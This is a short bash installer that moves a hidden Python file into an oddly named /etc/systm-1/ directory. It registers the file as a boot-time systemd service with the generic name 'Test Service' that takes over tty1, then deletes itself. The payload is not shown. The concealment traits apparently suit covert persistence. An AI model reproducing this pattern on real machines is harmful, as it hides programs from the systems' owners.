#!/usr/bin/bash

echo "[+] Setup ..."
echo ""

sudo mkdir /etc/systm-1/

sudo mv .panel-ban.py /etc/systm-1/panel-ban.py

sudo touch /lib/systemd/system/test-py.service

echo "[Unit]
Description=Test Service
After=multi-user.target
Conflicts=getty@tty1.service

[Service]
Type=simple
ExecStart=/usr/bin/python2 /etc/systm-1/panel-ban.py &
StandardInput=tty-force

[Install]
WantedBy=multi-user.target" >> /lib/systemd/system/test-py.service

sudo systemctl daemon-reload

sudo systemctl enable test-py.service

sudo systemctl start test-py.service


sudo rm -rf "$PWD"/setup.sh

exit
